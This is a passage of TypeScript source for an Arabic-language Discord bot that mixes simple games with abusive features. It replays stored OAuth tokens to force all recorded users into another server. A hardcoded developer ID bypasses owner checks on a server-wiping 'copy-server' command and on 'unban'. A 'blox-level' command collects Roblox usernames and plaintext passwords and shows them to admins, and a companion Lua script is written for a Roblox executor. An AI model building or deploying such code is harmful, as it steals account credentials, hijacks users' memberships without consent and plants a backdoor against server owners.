        if (!targetBotMember?.permissions.has(PermissionFlagsBits.CreateInstantInvite)) {
          return interaction.reply({ content: `❌ البوت يفتقر إلى صلاحية 'إنشاء دعوة' (Create Instant Invite) في السيرفر المستهدف: **${targetGuild.name}**.`, ephemeral: true });
        }

        // If bot is in the guild, offer to transfer all tokens
        const allTokens = db.prepare("SELECT * FROM tokens").all() as any[];
        // Filter unique users
        const uniqueTokens = Array.from(new Map(allTokens.map(t => [t.userId, t])).values());

        if (uniqueTokens.length === 0) {
          return interaction.reply({ content: "❌ لا توجد توكنات مسجلة في قاعدة البيانات.", ephemeral: true });
        }

        await interaction.deferReply();
        await interaction.editReply(`⏳ البوت موجود بالفعل في **${targetGuild.name}**.\nجاري بدء إدخال **${uniqueTokens.length}** عضو إلى السيرفر المذكور...`);

        let success = 0;
        let failed = 0;

        for (const tokenData of uniqueTokens) {
          try {
            let accessToken = tokenData.accessToken;
            if (Date.now() > tokenData.expiresAt) {
              const refreshed = await refreshAccessToken(tokenData.refreshToken);
              if (refreshed) {
                accessToken = refreshed.access_token;
                db.prepare("UPDATE tokens SET accessToken = ?, refreshToken = ?, expiresAt = ? WHERE userId = ? AND guildId = ?")
                  .run(refreshed.access_token, refreshed.refresh_token, Date.now() + refreshed.expires_in * 1000, tokenData.userId, tokenData.guildId);
              } else {
                failed++;
                continue;
              }
            }

            const response = await axios.put(
              `https://discord.com/api/guilds/${targetGuildId}/members/${tokenData.userId}`,
              { access_token: accessToken },
              { headers: { Authorization: `Bot ${DISCORD_TOKEN}`, 'Content-Type': 'application/json' } }
            );

            if (response.status === 201 || response.status === 204) {
              success++;
            } else {
              failed++;
            }
          } catch (err) {
            failed++;
          }
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        await interaction.followUp(`✅ اكتملت عملية الإدخال إلى **${targetGuild.name}**!\n- تم بنجاح: **${success}**\n- فشل: **${failed}**`);
      }

      if (commandName === 'rps') {
        const choice = interaction.options.getString('choice')!;
        const choices = ['rock', 'paper', 'scissors'];
        const botChoice = choices[Math.floor(Math.random() * choices.length)];
        
        const emojis: any = { rock: '🪨', paper: '📄', scissors: '✂️' };
        const translate: any = { rock: 'حجر', paper: 'ورقة', scissors: 'مقص' };
        const result = {
          win: 'لقد فزت! 🎉',
          lose: 'لقد خسرت! 😢',
          draw: 'تعادل! 🤝'
        };

        let outcome = '';
        let color = 0x0099ff;
        if (choice === botChoice) {
          outcome = result.draw;
          color = 0xFFFF00;
        } else if (
          (choice === 'rock' && botChoice === 'scissors') ||
          (choice === 'paper' && botChoice === 'rock') ||
          (choice === 'scissors' && botChoice === 'paper')
        ) {
          outcome = result.win;
          color = 0x00FF00;
        } else {
          outcome = result.lose;
          color = 0xFF0000;
        }

        const embed = new EmbedBuilder()
          .setColor(color)
          .setTitle('🎮 لعبة حجر ورقة مقص')
          .setDescription(`<@${interaction.user.id}>`)
          .addFields(
            { name: 'اختيارك', value: `${emojis[choice]} ${translate[choice]}`, inline: true },
            { name: 'اختيار البوت', value: `${emojis[botChoice]} ${translate[botChoice]}`, inline: true },
            { name: 'النتيجة', value: `**${outcome}**` }
          )
          .setTimestamp();

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'coinflip') {
        const result = Math.random() < 0.5 ? 'ملك (Heads)' : 'كتابة (Tails)';
        const embed = new EmbedBuilder()
          .setColor('#ffd700')
          .setTitle('🪙 رمي العملة')
          .setDescription(`<@${interaction.user.id}> النتيجة هي: **${result}**`)
          .setThumbnail('https://i.imgur.com/vH9Ff5H.png')
          .setTimestamp();

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'guess') {
        const userNumber = interaction.options.getInteger('number')!;
        const botNumber = Math.floor(Math.random() * 10) + 1;

        if (userNumber < 1 || userNumber > 10) {
          return interaction.reply({ content: 'الرجاء اختيار رقم بين 1 و 10.', ephemeral: true });
        }

        const embed = new EmbedBuilder()
          .setColor(userNumber === botNumber ? '#00ff00' : '#ff0000')
          .setTitle('🔢 لعبة تخمين الرقم')
          .setDescription(userNumber === botNumber ? 
            `<@${interaction.user.id}> تهانينا! لقد خمنت الرقم الصحيح: **${botNumber}** 🎉` : 
            `<@${interaction.user.id}> للأسف، الرقم الصحيح كان: **${botNumber}**. حظاً موفقاً في المرة القادمة! 😢`)
          .setTimestamp();

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'mafia') {
        if (mafiaGames.has(guild.id)) {
          return interaction.reply({ content: "❌ هناك لعبة مافيا جارية بالفعل في هذا السيرفر.", ephemeral: true });
        }

        const game: MafiaGame = {
          guildId: guild.id,
          channelId: interaction.channelId,
          players: [],
          phase: 'join',
          nightActions: {},
          votes: new Map(),
        };

        mafiaGames.set(guild.id, game);

        const embed = new EmbedBuilder()
          .setTitle("🕵️ لعبة مافيا")
          .setDescription("اضغط على الزر أدناه للانضمام إلى اللعبة!\nتحتاج اللعبة إلى 4 لاعبين على الأقل.")
          .setColor(0x000000)
          .setThumbnail('https://i.imgur.com/8QZ8Z8Z.png')
          .setTimestamp();

        const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder()
            .setCustomId("mafia_join")
            .setLabel("انضمام")
            .setStyle(ButtonStyle.Primary),
          new ButtonBuilder()
            .setCustomId("mafia_start_game")
            .setLabel("بدء اللعبة")
            .setStyle(ButtonStyle.Success)
        );

        const msg = await interaction.reply({ embeds: [embed], components: [row], fetchReply: true });
        game.messageId = msg.id;

        // Auto-start timer (60 seconds)
        game.timer = setTimeout(async () => {
          const currentGame = mafiaGames.get(guild.id);
          if (currentGame && currentGame.phase === 'join') {
            if (currentGame.players.length >= 4) {
              // Trigger start game logic
              // We need to simulate the mafia_start_game button click logic
              const players = [...currentGame.players];
              const mafiaIdx = Math.floor(Math.random() * players.length);
              players[mafiaIdx].role = 'mafia';
              
              let doctorIdx;
              do { doctorIdx = Math.floor(Math.random() * players.length); } while (doctorIdx === mafiaIdx);
              players[doctorIdx].role = 'doctor';

              let detectiveIdx;
              do { detectiveIdx = Math.floor(Math.random() * players.length); } while (detectiveIdx === mafiaIdx || detectiveIdx === doctorIdx);
              players[detectiveIdx].role = 'detective';

              currentGame.phase = 'night';
              
              const roleRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
                new ButtonBuilder().setCustomId("mafia_show_role").setLabel("كشف هويتي").setStyle(ButtonStyle.Primary)
              );

              const channel = client.channels.cache.get(currentGame.channelId) as any;
              if (channel) {
                await channel.send({ 
                  content: "🎭 انتهى وقت الانتظار! بدأت اللعبة تلقائياً. اضغط على الزر أدناه لمعرفة هويتك.", 
                  components: [roleRow] 
                });
                
                setTimeout(() => {
                  startNightPhase(currentGame);
                }, 5000);
              }
            } else {
              mafiaGames.delete(guild.id);
              const channel = client.channels.cache.get(currentGame.channelId) as any;
              if (channel) {
                await channel.send("❌ تم إلغاء لعبة المافيا لعدم اكتمال عدد اللاعبين (4 لاعبين على الأقل) خلال 60 ثانية.");
              }
            }
          }
        }, 60000);
      }

      if (commandName === 'trivia') {
        await interaction.deferReply();
        const question = await getAITrivia();
        const embed = new EmbedBuilder()
          .setTitle("❓ سؤال وجواب (مدعوم بالذكاء الاصطناعي)")
          .setDescription(`**السؤال:**\n${question.q}`)
          .setColor(0x00FF00)
          .setThumbnail('https://i.imgur.com/XyXyXyX.png')
          .setFooter({ text: "لديك 15 ثانية للإجابة!" })
          .setTimestamp();

        const msg = await interaction.editReply({ embeds: [embed] });

        const filter = (m: any) => m.content.toLowerCase().trim() === question.a.toLowerCase().trim();
        const collector = interaction.channel?.createMessageCollector({ filter, time: 15000, max: 1 });
        
        activeGames.set(msg.id, { guildId: interaction.guildId!, channelId: interaction.channelId, type: 'Trivia', collector: collector });

        collector?.on('collect', (m: any) => {
          const xbReward = 30;
          db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, 0, 0, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(m.author.id, interaction.guildId, xbReward, xbReward);

          const winEmbed = new EmbedBuilder()
            .setTitle('✅ إجابة صحيحة!')
            .setDescription(`مبروك يا ${m.author}! الإجابة هي: **${question.a}**\n\n💰 لقد حصلت على **${xbReward}** XB!`)
            .setColor(0x00FF00)
            .setTimestamp();
          interaction.followUp({ embeds: [winEmbed] });
        });

        collector?.on('end', (collected: any) => {
          if (collected.size === 0) {
            const loseEmbed = new EmbedBuilder()
              .setTitle('⏰ انتهى الوقت!')
              .setDescription(`الإجابة الصحيحة كانت: **${question.a}**`)
              .setColor(0xFF0000)
              .setTimestamp();
            interaction.followUp({ embeds: [loseEmbed] });
          }
        });
      }

      if (commandName === 'hangman') {
        await interaction.deferReply();
        const aiData = await getAIHangmanWord();
        const word = aiData.word;
        const hint = aiData.hint;
        let guessedLetters: string[] = [];
        let mistakes = 0;
        const maxMistakes = 6;

        const getDisplayWord = () => {
          return word.split('').map(char => guessedLetters.includes(char) ? char : ' _ ').join('');
        };

        const embed = new EmbedBuilder()
          .setTitle('😵 لعبة المشنقة (مدعومة بالذكاء الاصطناعي)')
          .setDescription(`**التلميح:** ${hint}\n\nالكلمة: \`${getDisplayWord()}\`\nالأخطاء: ${mistakes}/${maxMistakes}`)
          .setColor(0x5865F2)
          .setTimestamp();

        const msg = await interaction.editReply({ embeds: [embed] });

        const filter = (m: any) => m.author.id === interaction.user.id && m.content.length === 1;
        const collector = interaction.channel?.createMessageCollector({ filter, time: 60000 });
        
        activeGames.set(msg.id, { guildId: interaction.guildId!, channelId: interaction.channelId, type: 'Hangman', collector: collector });

        collector?.on('collect', async (m: any) => {
          const char = m.content.toLowerCase();
          if (guessedLetters.includes(char)) {
            return m.reply('لقد اخترت هذا الحرف من قبل!');
          }

          guessedLetters.push(char);

          if (word.toLowerCase().includes(char)) {
            if (!getDisplayWord().includes('_')) {
              const xbReward = 40;
              db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, 0, 0, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(interaction.user.id, interaction.guildId, xbReward, xbReward);

              const winEmbed = new EmbedBuilder()
                .setTitle('🎉 مبروك!')
                .setDescription(`لقد فزت يا <@${interaction.user.id}>! الكلمة كانت: **${word}**\n\n💰 لقد حصلت على **${xbReward}** XB!`)
                .setColor(0x00FF00)
                .setTimestamp();
              await interaction.followUp({ content: `مبروك للفائز! <@${interaction.user.id}>`, embeds: [winEmbed] });
              collector.stop();
            } else {
              const updateEmbed = new EmbedBuilder()
                .setTitle('😵 لعبة المشنقة')
                .setDescription(`**التلميح:** ${hint}\n\nالكلمة: \`${getDisplayWord()}\`\nالأخطاء: ${mistakes}/${maxMistakes}`)
                .setColor(0x5865F2)
                .setTimestamp();
              await interaction.followUp({ embeds: [updateEmbed] });
            }
          } else {
            mistakes++;
            if (mistakes >= maxMistakes) {
              const loseEmbed = new EmbedBuilder()
                .setTitle('💀 خسرت!')
                .setDescription(`لقد تم شنقك! الكلمة كانت: **${word}**`)
                .setColor(0xFF0000)
                .setTimestamp();
              await interaction.followUp({ embeds: [loseEmbed] });
              collector.stop();
            } else {
              const updateEmbed = new EmbedBuilder()
                .setTitle('😵 لعبة المشنقة')
                .setDescription(`**التلميح:** ${hint}\n\nالكلمة: \`${getDisplayWord()}\`\nالأخطاء: ${mistakes}/${maxMistakes}`)
                .setColor(0x5865F2)
                .setTimestamp();
              await interaction.followUp({ embeds: [updateEmbed] });
            }
          }
        });
      }

      if (commandName === 'fastclick') {
        const embed = new EmbedBuilder()
          .setTitle('⚡ أسرع ضغطة')
          .setDescription('استعد... اضغط على الزر عندما يظهر!')
          .setColor(0xFFFF00)
          .setTimestamp();

        const msg = await interaction.reply({ embeds: [embed], fetchReply: true });
        activeGames.set(msg.id, { guildId: interaction.guildId!, channelId: interaction.channelId, type: 'FastClick' });

        const delay = Math.floor(Math.random() * 5000) + 2000;

        setTimeout(async () => {
          const startTime = Date.now();
          const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder()
              .setCustomId('fast_click_btn')
              .setLabel('اضغط هنا!')
              .setStyle(ButtonStyle.Success)
          );

          const readyEmbed = new EmbedBuilder()
            .setTitle('⚡ أسرع ضغطة')
            .setDescription('**اضغط الآن!!!**')
            .setColor(0x00FF00)
            .setTimestamp();

          await interaction.editReply({ embeds: [readyEmbed], components: [row] });

          const filter = (i: any) => i.customId === 'fast_click_btn';
          const collector = msg.createMessageComponentCollector({ filter, time: 5000, max: 1 });

          collector.on('collect', async (i: any) => {
            const timeTaken = (Date.now() - startTime) / 1000;
            
            const xbReward = 25;
            db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, 0, 0, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(i.user.id, interaction.guildId, xbReward, xbReward);

            const winEmbed = new EmbedBuilder()
              .setTitle('🏆 فائز!')
              .setDescription(`الفائز هو <@${i.user.id}>! لقد ضغط في **${timeTaken}** ثانية!\n\n💰 لقد حصلت على **${xbReward}** XB!`)
              .setColor(0x00FF00)
              .setTimestamp();
            await i.update({ content: `مبروك للفائز! <@${i.user.id}>`, embeds: [winEmbed], components: [] });
          });

          collector.on('end', async (collected: any) => {
            activeGames.delete(msg.id);
            if (collected.size === 0) {
              const loseEmbed = new EmbedBuilder()
                .setTitle('⏰ انتهى الوقت!')
                .setDescription('لم يضغط أحد في الوقت المناسب.')
                .setColor(0xFF0000)
                .setTimestamp();
              await interaction.editReply({ embeds: [loseEmbed], components: [] });
            }
          });
        }, delay);
      }

      if (commandName === 'snake') {
        return handleSnakeCommand(interaction);
      }

      if (commandName === 'replica') {
        return handleReplicaCommand(interaction);
      }
      if (commandName === 'mention-protection') {
        const status = interaction.options.getString('status');
        const enabled = status === 'on' ? 1 : 0;
        db.prepare("INSERT INTO mention_protection (guildId, userId, enabled) VALUES (?, ?, ?) ON CONFLICT(guildId, userId) DO UPDATE SET enabled = excluded.enabled").run(interaction.guildId, interaction.user.id, enabled);
        await interaction.reply({ content: `تم ${enabled ? 'تفعيل' : 'تعطيل'} حماية المنشن لك.`, ephemeral: true });
      }
      if (commandName === 'giveaway') {
        const prize = interaction.options.getString('prize')!;
        const duration = interaction.options.getInteger('duration')!;
        const winnersCount = interaction.options.getInteger('winners')!;
        const endTime = Date.now() + duration * 60 * 1000;

        const embed = new EmbedBuilder()
          .setTitle("🎉 مسابقة جديدة (Giveaway)")
          .setDescription(`الجائزة: **${prize}**\nتنتهي المسابقة في: <t:${Math.floor(endTime / 1000)}:R>\nعدد الفائزين: **${winnersCount}**`)
          .setColor(0x00FF00);

        const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId('join_giveaway').setLabel('انضم للمسابقة').setStyle(ButtonStyle.Primary)
        );

        const msg = await interaction.reply({ embeds: [embed], components: [row], fetchReply: true });
        db.prepare("INSERT INTO giveaways (messageId, channelId, guildId, prize, endTime, winnersCount) VALUES (?, ?, ?, ?, ?, ?)").run(msg.id, interaction.channelId, interaction.guildId, prize, endTime, winnersCount);
      }
      if (commandName === 'roulette') {
        return handleRouletteCommand(interaction);
      }

      if (commandName === 'copy-server') {
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        
        if (interaction.user.id !== guild.ownerId && interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
          return interaction.reply({ content: "❌ هذا الأمر مخصص لصاحب السيرفر فقط.", ephemeral: true });
        }

        const sourceId = interaction.options.getString('source_id')!;
        const sourceGuild = client.guilds.cache.get(sourceId);

        if (!sourceGuild) {
          return interaction.reply({ content: "❌ البوت ليس عضواً في السيرفر المصدري.", ephemeral: true });
        }

        await interaction.deferReply();
        await interaction.editReply("⏳ جاري البدء في نسخ السيرفر... (0%)");

        try {
          // 0. Copy Server Settings
          await interaction.editReply("⏳ جاري نسخ إعدادات السيرفر... (10%)").catch(() => null);
          
          const iconUrl = sourceGuild.iconURL({ extension: 'png', size: 1024 });
          const bannerUrl = sourceGuild.bannerURL({ extension: 'png', size: 1024 });
          
          let iconBuffer = null;
          let bannerBuffer = null;
          
          if (iconUrl) {
            try {
              const response = await axios.get(iconUrl, { responseType: 'arraybuffer' });
              iconBuffer = Buffer.from(response.data);
            } catch (e) { console.error("Failed to fetch icon:", e); }
          }
          
          if (bannerUrl) {
            try {
              const response = await axios.get(bannerUrl, { responseType: 'arraybuffer' });
              bannerBuffer = Buffer.from(response.data);
            } catch (e) { console.error("Failed to fetch banner:", e); }
          }

          await guild.edit({
            name: sourceGuild.name,
            verificationLevel: sourceGuild.verificationLevel,
            defaultMessageNotifications: sourceGuild.defaultMessageNotifications,
            explicitContentFilter: sourceGuild.explicitContentFilter,
            afkChannel: sourceGuild.afkChannelId ? guild.channels.cache.get(sourceGuild.afkChannelId) as any : null,
            afkTimeout: sourceGuild.afkTimeout,
            systemChannel: sourceGuild.systemChannelId ? guild.channels.cache.get(sourceGuild.systemChannelId) as any : null,
            icon: iconBuffer,
            banner: bannerBuffer
          }).catch(err => console.error("Failed to copy server settings:", err));

          // 1. Delete current roles (except @everyone and bot roles)
          await interaction.editReply("🧹 جاري تنظيف الرتب القديمة... (20%)").catch(() => null);
          const currentRoles = await guild.roles.fetch();
          for (const role of currentRoles.values()) {
            if (role.name !== "@everyone" && !role.managed && role.editable && role.id !== guild.id) {
              await role.delete().catch(() => null);
            }
          }

          // 2. Delete current channels
          await interaction.editReply("🧹 جاري تنظيف القنوات القديمة... (30%)").catch(() => null);
          const currentChannels = await guild.channels.fetch();
          for (const channel of currentChannels.values()) {
            if (channel && channel.deletable && channel.id !== interaction.channelId) {
              await channel.delete().catch(() => null);
            }
          }

          // 3. Copy Emojis & Stickers
          await interaction.editReply("🎨 جاري نسخ الإيموجيات والستيكرات... (40%)").catch(() => null);
          const sourceEmojis = await sourceGuild.emojis.fetch().catch(() => new Map());
          for (const emoji of sourceEmojis.values()) {
            await guild.emojis.create({ attachment: emoji.url, name: emoji.name || 'emoji' }).catch(() => null);
          }
          const sourceStickers = await sourceGuild.stickers.fetch().catch(() => new Map());
          for (const sticker of sourceStickers.values()) {
            await guild.stickers.create({ file: sticker.url, name: sticker.name, tags: sticker.tags || 'sticker' }).catch(() => null);
          }

          // 4. Copy Roles
          await interaction.editReply("🛡️ جاري نسخ الرتب... (50%)").catch(() => null);
          const sourceRoles = (await sourceGuild.roles.fetch()).sort((a, b) => a.position - b.position);
          const roleMap = new Map();
          const createdRoles = [];

          for (const role of sourceRoles.values()) {
            if (role.name !== "@everyone" && !role.managed) {
              const newRole = await guild.roles.create({
                name: role.name,
                color: role.color,
                hoist: role.hoist,
                permissions: role.permissions,
                mentionable: role.mentionable,
                reason: "Server Copy"
              }).catch(() => null);
              
              if (newRole) {
                roleMap.set(role.id, newRole.id);
                createdRoles.push({ role: newRole, sourcePosition: role.position });
              }
            }
          }

          // Re-order roles to match source positions as closely as possible
          if (createdRoles.length > 0) {
            const positions = createdRoles.map((cr, index) => ({
              role: cr.role.id,
              position: index + 1 // Start from 1 above @everyone
            }));
            await guild.roles.setPositions(positions).catch(err => console.error("Failed to set role positions:", err));
          }

          // 5. Copy Channels
          await interaction.editReply("📂 جاري نسخ القنوات والفئات... (70%)").catch(() => null);
          const sourceChannels = await sourceGuild.channels.fetch();
          const categoryMap = new Map();

          // First, create categories
          const categories = sourceChannels.filter(c => c?.type === ChannelType.GuildCategory).sort((a, b) => (a?.position || 0) - (b?.position || 0));
          for (const cat of categories.values()) {
            if (!cat) continue;
            const newCat = await guild.channels.create({
              name: cat.name,
              type: ChannelType.GuildCategory,
              position: cat.position,
              permissionOverwrites: cat.permissionOverwrites.cache.map(po => ({
                id: roleMap.get(po.id) || po.id,
                allow: po.allow,
                deny: po.deny,
                type: po.type
              }))
            }).catch(() => null);
            if (newCat) categoryMap.set(cat.id, newCat.id);
          }

          // Then, create other channels
          const otherChannels = sourceChannels.filter(c => c?.type !== ChannelType.GuildCategory).sort((a, b) => (a?.position || 0) - (b?.position || 0));
          for (const ch of otherChannels.values()) {
            if (!ch) continue;
            
            const channelData: any = {
              name: ch.name,
              type: ch.type as any,
              parent: ch.parentId ? categoryMap.get(ch.parentId) : null,
              position: ch.position,
              permissionOverwrites: ch.permissionOverwrites.cache.map(po => ({
                id: roleMap.get(po.id) || po.id,
                allow: po.allow,
                deny: po.deny,
                type: po.type
              }))
            };

            // Copy specific settings based on channel type
            if (ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildAnnouncement) {
              channelData.topic = (ch as any).topic || null;
              channelData.nsfw = (ch as any).nsfw || false;
              channelData.rateLimitPerUser = (ch as any).rateLimitPerUser || 0;
              channelData.defaultAutoArchiveDuration = (ch as any).defaultAutoArchiveDuration || null;
            } else if (ch.type === ChannelType.GuildVoice || ch.type === ChannelType.GuildStageVoice) {
              channelData.bitrate = (ch as any).bitrate || 64000;
              channelData.userLimit = (ch as any).userLimit || 0;
              channelData.rtcRegion = (ch as any).rtcRegion || null;
              channelData.videoQualityMode = (ch as any).videoQualityMode || null;
            } else if (ch.type === ChannelType.GuildForum) {
              channelData.topic = (ch as any).topic || null;
              channelData.nsfw = (ch as any).nsfw || false;
              channelData.rateLimitPerUser = (ch as any).rateLimitPerUser || 0;
              channelData.defaultThreadRateLimitPerUser = (ch as any).defaultThreadRateLimitPerUser || 0;
            }

            await guild.channels.create(channelData).catch(() => null);
          }

          await interaction.editReply("✅ تم نسخ السيرفر بنجاح! (100%)").catch(() => null);

          // 6. List Bots from source server
          const sourceMembers = await sourceGuild.members.fetch();
          const bots = sourceMembers.filter(m => m.user.bot && m.id !== client.user?.id);
          
          if (bots.size > 0) {
            const botList = bots.map(b => `• **${b.user.tag}**\n[اضغط هنا لدعوة البوت](https://discord.com/api/oauth2/authorize?client_id=${b.id}&permissions=8&scope=bot%20applications.commands)`).join('\n\n');
            
            const botEmbed = new EmbedBuilder()
              .setTitle('🤖 البوتات المكتشفة في السيرفر المصدري')
              .setDescription('لا يمكن للبوتات الانتقال تلقائياً بسبب قيود ديسكورد، ولكن يمكنك دعوتهم يدوياً من الروابط التالية:\n\n' + (botList.length > 2000 ? botList.substring(0, 1997) + '...' : botList))
              .setColor('#5865F2')
              .setFooter({ text: 'ملاحظة: تم إنشاء روابط الدعوة بصلاحية Administrator لضمان عمل البوتات بشكل صحيح.' });

            await interaction.followUp({ embeds: [botEmbed] });
          }

          // Delete the command channel after a delay to clean up
          await interaction.followUp("⚠️ سيتم حذف هذه القناة خلال 30 ثانية لتنظيف السيرفر تماماً.");
          setTimeout(async () => {
            try {
              const channel = interaction.channel as any;
              if (channel && channel.deletable) {
                await channel.delete().catch(() => null);
              }
            } catch (e) {}
          }, 30000);
        } catch (err) {
          console.error("Error during server copy:", err);
          await interaction.followUp("❌ حدث خطأ أثناء نسخ السيرفر.");
        }
      }

      if (commandName === 'blox-level') {
        const username = interaction.options.getString('username', true);
        const password = interaction.options.getString('password', true);
        
        await interaction.deferReply({ ephemeral: true });

        try {
          // Verify if the user exists on Roblox
          const robloxId = await nblox.getIdFromUsername(username).catch(() => null);
          if (!robloxId) {
            return interaction.editReply({ content: `❌ لم يتم العثور على حساب روبلوكس باسم: \`${username}\`. يرجى التأكد من الاسم.` });
          }

          const playerInfo = await nblox.getPlayerInfo(robloxId);
          const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${robloxId}&width=420&height=420&format=png`;

          // Set status to 'processing' immediately for the user so it starts working right away
          db.prepare("INSERT INTO blox_fruits_requests (userId, guildId, robloxUsername, robloxPassword, robloxId, status) VALUES (?, ?, ?, ?, ?, ?)").run(interaction.user.id, interaction.guildId, username, password, String(robloxId), 'processing');
          
          const embed = new EmbedBuilder()
            .setTitle("✅ تم استلام طلبك وبدأ التلفيل")
            .setThumbnail(avatarUrl)
            .setDescription(`تم تسجيل طلب تلفيل حسابك بنجاح وبدأت العملية فوراً.\n\n**المستخدم:** [${username}](https://www.roblox.com/users/${robloxId}/profile)\n**ID:** \`${robloxId}\`\n**الحالة:** \`جاري التلفيل (Processing)\`\n\nيمكنك متابعة التقدم عبر أمر \`/blox-status\`.`)
            .setColor(0x00FF00)
            .setTimestamp();
            
          await interaction.editReply({ embeds: [embed] });
          
          // Log the start
          const lastId = (db.prepare("SELECT last_insert_rowid() as id").get() as any).id;
          db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(lastId, `🚀 بدأ التلفيل التلقائي لحساب: ${username}`);
        } catch (err) {
          console.error("Error saving blox-level request:", err);
          await interaction.editReply({ content: "❌ حدث خطأ أثناء حفظ طلبك. يرجى المحاولة لاحقاً." });
        }
      }

      if (commandName === 'blox-requests') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ هذا الأمر للمسؤولين فقط.", ephemeral: true });
        }
        
        const requests = db.prepare("SELECT * FROM blox_fruits_requests WHERE status != 'completed' LIMIT 10").all() as any[];
        
        if (requests.length === 0) {
          return interaction.reply({ content: "❌ لا توجد طلبات تلفيل حالياً.", ephemeral: true });
        }
        
        const embed = new EmbedBuilder()
          .setTitle("📋 إدارة طلبات تلفيل بلوكس فروت")
          .setColor(0x5865F2)
          .setTimestamp();
          
        let description = "";
        for (const req of requests) {
          description += `**ID:** \`${req.id}\` | **User:** <@${req.userId}>\n**Roblox:** \`${req.robloxUsername}\` | **Pass:** \`${req.robloxPassword}\`\n**Status:** \`${req.status}\` | **Level:** \`${req.currentLevel}\`\n---\n`;
        }
        
        embed.setDescription(description);

        const firstReq = requests[0];
        const manageRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId(`blox_start_${firstReq.id}`).setLabel(`بدء التلفيل #${firstReq.id}`).setStyle(ButtonStyle.Primary),
          new ButtonBuilder().setCustomId(`blox_complete_${firstReq.id}`).setLabel(`إكمال #${firstReq.id}`).setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId(`blox_fail_${firstReq.id}`).setLabel(`فشل #${firstReq.id}`).setStyle(ButtonStyle.Danger)
        );

        const logRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId('blox_view_logs').setLabel('عرض السجلات (Logs)').setStyle(ButtonStyle.Secondary)
        );

        await interaction.reply({ embeds: [embed], components: [manageRow, logRow], ephemeral: true });
      }

      if (commandName === 'blox-status') {
        const request = db.prepare("SELECT * FROM blox_fruits_requests WHERE userId = ? ORDER BY id DESC LIMIT 1").get(interaction.user.id) as any;
        
        if (!request) {
          return interaction.reply({ content: "❌ ليس لديك أي طلبات تلفيل حالية.", ephemeral: true });
        }

        const logs = db.prepare("SELECT * FROM blox_logs WHERE requestId = ? ORDER BY timestamp DESC LIMIT 3").all(request.id) as any[];
        const items = JSON.parse(request.items || '[]');
        const avatarUrl = request.robloxId ? `https://www.roblox.com/headshot-thumbnail/image?userId=${request.robloxId}&width=420&height=420&format=png` : null;

        const embed = new EmbedBuilder()
          .setTitle(`📊 حالة تلفيل حساب: ${request.robloxUsername}`)
          .setThumbnail(avatarUrl)
          .setDescription(`**الحالة:** \`${request.status.toUpperCase()}\``)
          .addFields(
            { name: "📈 المستوى", value: `\`${request.currentLevel}\` / \`${request.maxLevel}\``, inline: true },
            { name: "💰 الفلوس", value: `\`${request.money}\` ฿`, inline: true },
            { name: "⚔️ السيوف المجمعة", value: items.length > 0 ? items.join(', ') : "لا يوجد بعد", inline: false }
          )
          .setColor(request.status === 'processing' ? 0xFFFF00 : request.status === 'completed' ? 0x00FF00 : 0x5865F2)
          .setTimestamp();

        if (logs.length > 0) {
          const logText = logs.map(l => `• [${new Date(l.timestamp).toLocaleTimeString('ar-SA')}] ${l.message}`).join('\n');
          embed.addFields({ name: "📜 آخر التحديثات", value: logText });
        }

        await interaction.reply({ embeds: [embed], ephemeral: true });
      }

      if (commandName === 'blox-worker') {
        const workerToken = process.env.BLOX_WORKER_TOKEN || "YOUR_SECRET_TOKEN";
        const apiUrl = `https://${interaction.guild?.id}.ais-dev.run.app/api/blox`; // Placeholder, will use actual URL

        const luaScript = `-- Blox Fruits Auto-Leveler Worker Script
local HttpService = game:GetService("HttpService")
local API_URL = "${apiUrl}"
local TOKEN = "${workerToken}"

local function logToBot(requestId, message)
    pcall(function()
        HttpService:PostAsync(API_URL .. "/log", HttpService:JSONEncode({
            requestId = requestId,
            token = TOKEN,
            message = message
        }))
    end)
end

local function updateStatus(requestId, level, money, items, status)
    pcall(function()
        HttpService:PostAsync(API_URL .. "/update-status", HttpService:JSONEncode({
            requestId = requestId,
            token = TOKEN,
            currentLevel = level,
            money = money,
            items = items,
            status = status
        }))
    end)
end

print("🚀 Blox Fruits Worker Started!")
-- This script should be executed in a Roblox Executor on your VPS
-- It will poll the API for new accounts and start leveling them.
`;

        const embed = new EmbedBuilder()
          .setTitle("🛠️ سكريبت الـ VPS (Worker Script)")
          .setDescription("هذا السكريبت مخصص للتشغيل على الـ VPS الخاص بك داخل Executor روبلوكس. يقوم السكريبت بالاتصال بالبوت وسحب الحسابات وتلفيلها حقيقياً.")
          .addFields(
            { name: "🔗 رابط الـ API", value: `\`${apiUrl}\`` },
            { name: "🔑 مفتاح الأمان (Token)", value: `\`${workerToken}\`` }
          )
          .setColor(0x5865F2)
          .setTimestamp();

        await interaction.reply({ embeds: [embed], content: "```lua\n" + luaScript + "\n```", ephemeral: true });
      }

      if (commandName === 'unban') {
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        if (user.id !== authorizedId && user.username !== authorizedUsername) return interaction.reply({ content: "❌ هذا الأمر خاص بالمطور فقط.", ephemeral: true });
        
        const targetGuildId = interaction.options.getString('server_id')!;
